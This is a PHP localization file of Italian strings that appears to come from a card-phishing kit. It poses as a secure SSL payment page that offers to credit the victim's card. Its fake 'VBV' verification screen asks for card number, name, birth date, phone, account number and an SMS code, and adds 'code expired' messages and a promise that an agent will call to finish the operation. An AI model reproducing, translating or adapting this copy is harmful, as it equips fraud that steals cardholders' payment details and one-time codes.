<?php
$language = array(
    'title' => array(
        '1' => 'Pagamento',
    ),
	
    'secure_text' => array(
        '1' => 'Con tecnologia SSL',
        '2' => 'i tuoi dati personali sono sempre protetti.',
    ),
	
    'card_title' => array(
        '1' => 'Accredita la mia carta',
    ),

    'order_btn' => array(
        '1' => 'Pagamento',
        '2' => 'Pagamento sicuro tramite SSL',
    ),

    'biling' => array(
        '1' => 'I tuoi dati di contatto',
            '2' => 'Nome',
            '3' => 'Cognome',
            '4' => 'Email',
    ),
    
	'details_submit' => array(
        '1' => 'Avanti',
    ),

    'paiement_iframe'   => array(
        'details_title' => array(
            '1' => '1 pagamenti',
            '2' => 'Informazioni sul pagamento',
            '3' => 'Costo',
            '4' => 'Dettaglio',
            '5' => 'Totale parziale',
            '6' => 'IVA',
            '7' => 'Totale',
            '8' => 'Inserisci i tuoi dati di pagamento',
        ),
        'formpayment' => array(
			'1' => 'Numero di telefono',
			'2' => 'Numero carta',
			'3' => 'Data di scadenza',
			'4' => 'codice di sicurezza',
			'5' => 'Convalida',
		),
    ),

    'vbv' => array(
        'lines' => array(
            '1' => ' ',
            '2' => 'aiuta a proteggere il tuo',
            '3' => 'Carta contro l\'uso non autorizzato online - senza costi aggiuntivi. Usare',
            '4' => 'Conferma il codice ricevuto via SMS per ricevere il pagamento',
            '5' => 'quindi fai clic su Convalida',
            '6' => 'Nb: se non ricevi un codice, uno dei nostri agenti ti chiamerà per finalizzare l\'operazione',
        ),
        '1'     => 'Commerciante',
        '2'     => 'Importo',
        '3'     => 'Data',
        '4'     => 'Numero carta',
        '5'     => 'Tipo di carta',
        '6'     => 'Nome come stampato sulla carta',
        '7'     => 'Data di nascita del titolare della carta principale',
        '8'     => '(GG/MM/AAAA)',
        '9'     => 'Numero di telefono personale',
        '10'    => 'Numero di conto',
        '11'    => 'Convalida',
        '12'    => '"Codice scaduto, attendere che ti venga inviato un nuovo codice tra 30 secondi"',
        '13'    => '"Non valido"',
    ),

    'footer_top'   => array(
        '1' => 'Contattaci',
        '2' => 'Condizioni di vendita',
            '3' => 'Negozio creato con',
            '4' => 'Politica di sicurezza',
    ),
    
);

?>